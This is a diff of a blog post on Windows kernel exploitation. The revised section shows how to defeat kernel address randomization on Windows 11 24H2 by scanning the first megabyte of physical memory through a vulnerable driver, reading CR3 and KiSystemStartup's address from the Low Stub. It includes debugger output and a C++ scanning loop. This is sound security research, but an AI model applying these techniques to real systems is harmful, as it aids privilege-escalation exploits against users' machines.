@@ -120,56 +120,30 @@
 
                         In the previous post, I leveraged the Low Stub, which is always present at the beginning of the physical memory layout of HVCI-enabled systems, to retrieve the value of CR3 in order to initiate the process of translating <b>leaked</b> virtual addresses into physical addresses, since I'm exploiting a driver that only provides access on physical memory, so as to make any exploitation technique possible on this driver as on a driver exposing R/W primitives on virtual memory. Since Windows 11 24H2, it is no longer possible to rely on EnumDeviceDrivers or NtQuerySystemInformation to leak, among other things, kernel module addresses from a medium integrity process, and SeDebugPrivilege is now required for this. <a target="_blank" href="https://windows-internals.com/kaslr-leaks-restriction/">This blog post by Yarden Shafir</a> details these changes at the kernel level. There are tools like <a target="_blank" href="https://github.com/exploits-forsale/prefetch-tool">prefetch-tool</a>, which <a target="_blank" href="https://hackyboiz.github.io/2025/04/13/l0ch/bypassing-kernel-mitigation-part0/en/#Bypassing-KASLR-Mitigation-in-24H2">which uses TLB vs no-TLB timing</a> on modern CPUs for <b>guessing</b> the NTOS address, this one worked on my host machine but for an unknown reason, not on my Windows 11 24H2 VM with which I'm working on this blog post.
 
-                        <br>
-                        <br>
+                        <br><br>
 
-                        The thing is, the Low Stub doesn't just provide control registers, but a lot of other things, including NTOS kernel addresses of <b>non-exported functions</b>, so even if you recover these addresses, you don't really know what they correspond to (<i>if you don't hardcode their offset, which is something we will avoid</i>). 
-Many of these addresses are specific to the HAL layer, this can be seen by unrolling the Low Stub to which HalpLowStub points:
+                        The Low Stub is always located in the first megabyte of the physical address space. It resides somewhere between physical addresses 0x0 and 0x100000. The <a href="https://github.com/mirror/reactos/blob/master/reactos/hal/halx86/acpi/halacpi.c#L847C4-L860C6">ReactOS source code</a> provides a clear example of how the Low Stub is allocated within this area, with 0x100000 set as the upper limit for the physical address:
 
-<br><br>
+                        <br><br>
 
-                        <pre class="text" style="color: black;"><code><b>0: kd> dqs poi(HalpLowStub) L0n1000</b>
-
-fffff7d7`8000b000  00000001`00064de9
-fffff7d7`8000b008  1018003f`00000001
-
-[...]
-
-fffff7d7`8000eff0  00000000`00000000
-fffff7d7`8000eff8  00000000`00000000
-fffff7d7`8000f000  fffff801`5f863d10 nt!HalpRegisteredInterruptControllers
-fffff7d7`8000f008  fffff801`5f863d10 nt!HalpRegisteredInterruptControllers
-fffff7d7`8000f010  fffff7d7`8000f178
-fffff7d7`8000f018  00000000`00000030
-fffff7d7`8000f020  fffff801`5ef71710 nt!HalpApicInitializeLocalUnit
-fffff7d7`8000f028  fffff801`5ef9f4e0 nt!HalpApicInitializeIoUnit
-fffff7d7`8000f030  fffff801`5ef72820 nt!HalpApicSetPriority
-fffff7d7`8000f038  fffff801`5efb0860 nt!HalpApicGetLocalUnitError
-fffff7d7`8000f040  fffff801`5efb0470 nt!HalpApicClearLocalUnitError
-fffff7d7`8000f048  00000000`00000000
-fffff7d7`8000f050  00000000`00000000
-fffff7d7`8000f058  00000000`00000000
-fffff7d7`8000f060  fffff801`5f127cf0 nt!HalpApicWriteEndOfInterrupt
-fffff7d7`8000f068  fffff801`5f013ae0 nt!HalpApicX2EndOfInterrupt
-fffff7d7`8000f070  fffff801`5ef9de00 nt!HalpApicSetLineState
-fffff7d7`8000f078  fffff801`5ef1ea90 nt!HalpApicRequestInterrupt
-fffff7d7`8000f080  fffff801`5efaa050 nt!HalpApicStartProcessor
-fffff7d7`8000f088  fffff801`5efa7e20 nt!HalpApicGenerateMessage
-fffff7d7`8000f090  fffff801`5efaca70 nt!HalpApicConvertId
-fffff7d7`8000f098  fffff801`5f132b80 nt!HalpApicSaveLocalInterrupts
-fffff7d7`8000f0a0  fffff801`5f132aa0 nt!HalpApicReplayLocalInterrupts
-fffff7d7`8000f0a8  fffff801`5f127b50 nt!HalpApicDeinitializeLocalUnit
-fffff7d7`8000f0b0  00000000`00000000
-fffff7d7`8000f0b8  fffff801`5efc8f60 nt!HalpApicQueryAndGetSource
-fffff7d7`8000f0c0  00000000`00000000
-fffff7d7`8000f0c8  00000000`00000000
-fffff7d7`8000f0d0  00000000`00000000
-
-[...]</code></pre>
+                        <pre class="cpp"><code>/* Do we have a low stub address yet? */
+if (!HalpLowStubPhysicalAddress.QuadPart)
+{
+    /* Allocate it */
+    HalpLowStubPhysicalAddress.QuadPart = HalpAllocPhysicalMemory(LoaderBlock,
+                                                                0x100000,
+                                                                1,
+                                                                FALSE);
+    if (HalpLowStubPhysicalAddress.QuadPart)
+    {
+        /* Map it */
+        HalpLowStub = HalpMapPhysicalMemory64(HalpLowStubPhysicalAddress, 1);
+    }
+}</code></pre>
 
 <br>
 
-The low stub is always located between the physical addresses 0x10000 and 0x20000 (to be broad). Here, it is located at physical address <code>0x11000</code>:
+Here, the Low Stub is located at physical address <code>0x11000</code>:
 
 <br><br>
 
@@ -183,27 +157,60 @@ Amd64VtoP: PDPE 00000000f7f02af0
 Amd64VtoP: PDE 00000000f7f05000
 Amd64VtoP: PTE 00000000f7f06058
 Amd64VtoP: Mapped phys 0000000000011000
-Virtual address fffff7d78000b000 translates to physical address 11000.
+Virtual address fffff7d78000b000 translates to physical address <b>11000</b>.
+
+0: kd> ? poi(HalpLowStubPhysicalAddress)
+Evaluate expression: 69632 = <b>00000000`00011000</b>
 </code></pre>
 
 <br>
 
-One address in particular caught my attention, that of KiSystemStartup, which is relatively early in the Low Stub:
+At offset +0x90 of the Low Stub, there is a structure of type KPROCESSOR_STATE:
 
 <br><br>
 
-<pre class="text"><code>2: kd> dqs poi(HalpLowStub) L0n10000
-
-[...]
-
-fffff7ef`4000b278  fffff806`1c087010 <b style="color: red;">nt!KiSystemStartup</b>
-
-[...]
+<pre class="text"><code>0: kd> dt /p _KPROCESSOR_STATE 0x11000+0x90
+nt!_KPROCESSOR_STATE
+   +0x000 SpecialRegisters : _KSPECIAL_REGISTERS
+   +0x0f0 ContextFrame     : _CONTEXT
 </code></pre>
 
 <br>
 
-KiSystemStartup is no more than the <b>entry point</b> of the kernel! whose RVA can easily be retrieved by parsing the PE image of ntoskrnl.exe:
+The SpecialRegisters member contains, among other things, the values of the control registers, including CR3, which provides the base address of the PML4:
+
+<br><br>
+
+<pre class="text"><code>0: kd> dt /p _KPROCESSOR_STATE 0x11000+0x90 SpecialRegisters.Cr3
+nt!_KPROCESSOR_STATE
+   +0x000 SpecialRegisters     : 
+      +0x010 Cr3                  : 0x7d5000
+
+0: kd> dt /p _KPROCESSOR_STATE 0x11000+0x90 SpecialRegisters.Cr4
+nt!_KPROCESSOR_STATE
+   +0x000 SpecialRegisters     : 
+      +0x018 Cr4                  : 0x350ef8
+</code></pre>
+
+<br>
+
+ContextFrame, of type <a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context">CONTEXT</a>, contains processor-specific register data. This context appears to be related to the system startup, with RIP holding a particularly significant value:
+
+<br><br>
+
+<pre class="text"><code>0: kd> dt /p _KPROCESSOR_STATE 0x11090 ContextFrame.Rip
+nt!_KPROCESSOR_STATE
+   +0x0f0 ContextFrame     : 
+      +0x0f8 Rip              : 0xfffff805`5d487010
+
+5: kd> u 0xfffff805`5d487010 L1
+nt!KiSystemStartup:
+fffff805`5d487010 4883ec38        sub     rsp,38h
+</code></pre>
+
+<br>
+
+RIP holds the address of KiSystemStartup, which is no more than the <b>entry point</b> to the kernel, whose RVA can easily be retrieved by parsing the PE image of ntoskrnl.exe:
 
 <br><br>
 
@@ -218,7 +225,7 @@ start             end                 module name
 
 <br>
 
-The Windows kernel aligns to 2MB boundaries since it leverages large-page memory mappings:
+The Windows kernel aligns to 2MB boundaries since it leverages large-page memory mappings. Note that the kernel is only large-page aligned <a href="https://x.com/sixtyvividtails/status/1933289653223792809">when the amount of RAM exceeds 2 GB</a> (however, since Windows 11 requires 4 GB at minimum, this should not be an issue):
 
 <br><br>
 
@@ -234,11 +241,11 @@ Evaluate expression: 0 = 00000000`00000000
 
 <br>
 
-In this way, we can scan the Low Stub for an address suffixed with the last 3 bytes of the entry point's RVA. If we find this address, we simply subtract the value of the entry point's RVA, which gives us the kernel's address :)
+Thus, we can scan the first megabyte of the physical memory layout, looking for an address suffixed with the last 3 bytes of the entry point's RVA. If we find this address, we simply subtract the value of the entry point's RVA, which gives us the kernel's address :)
 
 <br><br>
 
-<pre class="cpp"><code>for (physical_offset = 0x10000; physical_offset < 0x20000; physical_offset += sizeof(UINT64)) {
+<pre class="cpp"><code>for (physical_offset = 0x0; physical_offset < 0x100000; physical_offset += sizeof(UINT64)) {
 
         UINT64 qword_value = ReadMemoryU64(memory_data, physical_offset);
 
